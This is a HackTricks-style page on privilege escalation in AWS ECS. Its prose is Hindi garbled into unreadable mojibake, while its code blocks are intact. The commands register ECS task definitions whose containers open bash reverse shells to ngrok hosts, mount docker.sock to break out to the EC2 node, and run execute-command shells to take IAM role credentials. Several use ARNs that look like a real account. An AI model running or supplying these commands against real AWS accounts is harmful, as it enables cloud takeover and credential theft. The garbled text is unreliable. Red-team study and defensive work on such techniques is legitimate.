# AWS - ECS Privesc

<details>

<summary><strong>‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§®‡§æ‡§Ø‡§ï ‡§§‡§ï AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç**, ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç, ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§ï‡§æ ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π
* üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) ‡§Æ‡•á‡§Ç **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** ‡§Ø‡§æ [**telegram group**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§Ø‡§æ **Twitter** ‡§™‡§∞ üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm) ‡§ï‡•ã **‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§™‡§®‡•Ä ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç.

</details>

## ECS

ECS ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§Ö‡§ß‡§ø‡§ï **‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è**:

{% content-ref url="../aws-services/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-services/aws-ecs-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

ECS ‡§Æ‡•á‡§Ç `iam:PassRole`, `ecs:RegisterTaskDefinition` ‡§î‡§∞ `ecs:RunTask` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **‡§®‡§à ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§°‡•á‡§´‡§ø‡§®‡§ø‡§∂‡§® ‡§ú‡§®‡§∞‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ö‡•Å‡§∞‡§æ ‡§≤‡•á‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§á‡§∏‡•á ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§è‡§ï ‡§Ö‡§≤‡§ó ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Ä‡§ß‡§æ privesc‡•§

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•Ä, ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ECS ‡§Æ‡•á‡§Ç **‡§®‡§Ø‡§æ ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§°‡•á‡§´‡§ø‡§®‡§ø‡§∂‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ö‡•Å‡§∞‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§á‡§∏‡•á ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç, ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§°‡•á‡§´‡§ø‡§®‡§ø‡§∂‡§® ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Ä‡§ß‡§æ privesc‡•§

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•Ä, ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ‡§Ø‡§æ **`ecs:CreateService`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ECS ‡§Æ‡•á‡§Ç **‡§®‡§Ø‡§æ ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§°‡•á‡§´‡§ø‡§®‡§ø‡§∂‡§® ‡§§‡•à‡§Ø‡§æ‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•Ä ‡§ö‡•ã‡§∞‡•Ä ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§ï‡§Æ ‡§∏‡•á ‡§ï‡§Æ 1 ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§ö‡§≤‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡•Ä ‡§®‡§à ‡§∏‡•á‡§µ‡§æ ‡§¨‡§®‡§æ‡§ï‡§∞ ‡§á‡§∏‡•á ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Ä‡§ß‡§æ ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï‡•§

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

‡§Ø‡§π ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø ‡§™‡§ø‡§õ‡§≤‡•á ‡§µ‡§æ‡§≤‡•ã‡§Ç ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® **`iam:PassRole`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø **‡§ï‡•á ‡§¨‡§ø‡§®‡§æ**‡•§\
‡§Ø‡§π ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ï‡•ã‡§à ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§µ‡§π ‡§¨‡§ø‡§®‡§æ ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§π‡•ã, ‡§Ü‡§™ **‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ö‡§≤‡§æ‡§ï‡§∞ ‡§®‡•ã‡§° ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§î‡§∞ **EC2 IAM ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ö‡•Å‡§∞‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§î‡§∞ ‡§®‡•ã‡§° ‡§Æ‡•á‡§Ç ‡§ö‡§≤ ‡§∞‡§π‡•á **‡§Ö‡§®‡•ç‡§Ø ECS ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ã‡§Ç ‡§ï‡•Ä ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§è‡§Å**‡•§\
‡§Ü‡§™ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø **‡§Ö‡§®‡•ç‡§Ø ‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã EC2 ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§ú‡§ø‡§∏‡•á ‡§Ü‡§™ ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç ‡§â‡§®‡§ï‡•Ä ‡§∏‡§æ‡§ñ ‡§ö‡•Å‡§∞‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è (‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø [**‡§®‡•ã‡§° ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï ‡§Ö‡§®‡•Å‡§≠‡§æ‡§ó**](aws-ecs-privesc.md#privesc-to-node) ‡§Æ‡•á‡§Ç ‡§ö‡§∞‡•ç‡§ö‡§æ ‡§ï‡•Ä ‡§ó‡§à ‡§π‡•à)‡•§

{% hint style="warning" %}
‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ ‡§ï‡•á‡§µ‡§≤ ‡§§‡§≠‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ú‡§¨ **ECS ‡§ï‡•ç‡§≤‡§∏‡•ç‡§ü‡§∞ EC2** ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•ã ‡§î‡§∞ Fargate ‡§ï‡§æ ‡§®‡§π‡•Ä‡§Ç‡•§
{% endhint %}
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ú‡§ø‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** ‡§π‡•à, ‡§µ‡§π ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ **‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§î‡§∞ ‡§â‡§∏‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á IAM ‡§∞‡•ã‡§≤ ‡§ï‡•ã ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§æ‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à (‡§Ü‡§™‡§ï‡•ã describe ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø `aws ecs execute-command` ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡§π ‡§ú‡§∞‡•Ç‡§∞‡•Ä ‡§π‡•à)‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•ã **ExecuteCommand ‡§è‡§ú‡•á‡§Ç‡§ü** ‡§ö‡§≤‡§æ ‡§∞‡§π‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è (‡§ú‡•ã ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à)‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

* **‡§π‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§Æ‡•á‡§Ç ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡•á‡§Ç**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
* ‡§Ø‡§¶‡§ø ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:RunTask`** ‡§π‡•à, ‡§§‡•ã `aws ecs run-task --enable-execute-command [...]` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§ö‡§≤‡§æ‡§è‡§Ç‡•§
* ‡§Ø‡§¶‡§ø ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:StartTask`** ‡§π‡•à, ‡§§‡•ã `aws ecs start-task --enable-execute-command [...]` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§ö‡§≤‡§æ‡§è‡§Ç‡•§
* ‡§Ø‡§¶‡§ø ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:CreateService`** ‡§π‡•à, ‡§§‡•ã `aws ecs create-service --enable-execute-command [...]` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§∏‡•á‡§µ‡§æ ‡§¨‡§®‡§æ‡§è‡§Ç‡•§
* ‡§Ø‡§¶‡§ø ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:UpdateService`** ‡§π‡•à, ‡§§‡•ã `aws ecs update-service --enable-execute-command [...]` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§∏‡•á‡§µ‡§æ ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

‡§Ü‡§™ **‡§™‡§ø‡§õ‡§≤‡•á ECS privesc ‡§ñ‡§Ç‡§°‡•ã‡§Ç** ‡§Æ‡•á‡§Ç ‡§á‡§® ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™‡•ã‡§Ç ‡§ï‡•á **‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§

**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ã‡§Ç ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á ‡§Ö‡§≤‡§ó ‡§∞‡•ã‡§≤ ‡§Æ‡•á‡§Ç Privesc‡•§

### `ssm:StartSession`

**ssm privesc ‡§™‡•É‡§∑‡•ç‡§†** ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç ‡§ï‡§ø ‡§Ü‡§™ ‡§á‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡•à‡§∏‡•á ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç **ECS ‡§Æ‡•á‡§Ç privesc ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è**:

{% content-ref url="aws-ssm-privesc.md" %}
[aws-ssm-privesc.md](aws-ssm-privesc.md)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

**ec2 privesc ‡§™‡•É‡§∑‡•ç‡§†** ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç ‡§ï‡§ø ‡§Ü‡§™ ‡§á‡§® ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡•à‡§∏‡•á ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç **ECS ‡§Æ‡•á‡§Ç privesc ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è**:

{% content-ref url="aws-ec2-privesc.md" %}
[aws-ec2-privesc.md](aws-ec2-privesc.md)
{% endcontent-ref %}

### `?ecs:RegisterContainerInstance`

TODO: ‡§ï‡•ç‡§Ø‡§æ ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§Ö‡§≤‡§ó AWS ‡§ñ‡§æ‡§§‡•á ‡§∏‡•á ‡§è‡§ï ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è ‡§§‡§æ‡§ï‡§ø ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§Æ‡§∂‡•Ä‡§®‡•ã‡§Ç ‡§ï‡•á ‡§§‡§π‡§§ ‡§ö‡§≤‡§æ‡§è ‡§ú‡§æ‡§è‡§Ç??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

{% hint style="info" %}
TODO: ‡§á‡§∏‡•á ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§ï‡§∞‡•á‡§Ç
{% endhint %}

